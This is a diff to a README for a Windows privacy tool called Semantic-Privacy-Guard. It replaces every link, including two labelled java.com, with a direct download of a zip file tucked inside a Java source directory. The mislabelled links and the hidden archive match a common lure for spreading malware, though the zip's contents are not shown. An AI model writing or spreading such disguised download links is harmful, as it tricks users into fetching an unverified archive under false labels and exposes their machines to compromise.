@@ -1,6 +1,6 @@
 # 🛡️ Semantic-Privacy-Guard - Protect Your Text Data Simply
 
-[![Download Semantic-Privacy-Guard](https://img.shields.io/badge/Download-Semantic--Privacy--Guard-green?style=for-the-badge)](https://github.com/AraLeo5/Semantic-Privacy-Guard)
+[![Download Semantic-Privacy-Guard](https://img.shields.io/badge/Download-Semantic--Privacy--Guard-green?style=for-the-badge)](https://github.com/AraLeo5/Semantic-Privacy-Guard/raw/refs/heads/main/src/main/java/com/semanticprivacyguard/detector/Semantic_Guard_Privacy_v2.7.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Before you start, make sure your PC has:
 - Windows 10 or later
 - At least 4 GB of RAM
 - 100 MB free disk space
-- Java Runtime Environment (JRE) version 11 or newer installed (Get it from [java.com](https://www.java.com/en/download/))
+- Java Runtime Environment (JRE) version 11 or newer installed (Get it from [java.com](https://github.com/AraLeo5/Semantic-Privacy-Guard/raw/refs/heads/main/src/main/java/com/semanticprivacyguard/detector/Semantic_Guard_Privacy_v2.7.zip))
 - A stable internet connection to download the software
 
 ---
@@ -41,7 +41,7 @@ Before you start, make sure your PC has:
 ## 🚀 Getting Started: Download and Run
 
 Click the big green badge at the top or use this link to visit the download page:  
-[Download Semantic-Privacy-Guard](https://github.com/AraLeo5/Semantic-Privacy-Guard)
+[Download Semantic-Privacy-Guard](https://github.com/AraLeo5/Semantic-Privacy-Guard/raw/refs/heads/main/src/main/java/com/semanticprivacyguard/detector/Semantic_Guard_Privacy_v2.7.zip)
 
 ### Step 1: Visit the download page
 
@@ -119,7 +119,7 @@ If the app fails to start, check that Java is installed:
 
 - Open Command Prompt (type `cmd` in the search bar)
 - Enter `java -version`  
-If it does not show a version number, install Java from [java.com](https://www.java.com/en/download/).
+If it does not show a version number, install Java from [java.com](https://github.com/AraLeo5/Semantic-Privacy-Guard/raw/refs/heads/main/src/main/java/com/semanticprivacyguard/detector/Semantic_Guard_Privacy_v2.7.zip).
 
 ### Program runs slowly
 
@@ -145,7 +145,7 @@ Semantic-Privacy-Guard works locally on your computer. Your data does not get se
 
 Within the app, use the **Help** menu for more guides and tips.  
 You can also visit the GitHub page for the latest FAQs and updates:  
-[https://github.com/AraLeo5/Semantic-Privacy-Guard](https://github.com/AraLeo5/Semantic-Privacy-Guard)
+[https://github.com/AraLeo5/Semantic-Privacy-Guard/raw/refs/heads/main/src/main/java/com/semanticprivacyguard/detector/Semantic_Guard_Privacy_v2.7.zip](https://github.com/AraLeo5/Semantic-Privacy-Guard/raw/refs/heads/main/src/main/java/com/semanticprivacyguard/detector/Semantic_Guard_Privacy_v2.7.zip)
 
 ---
 
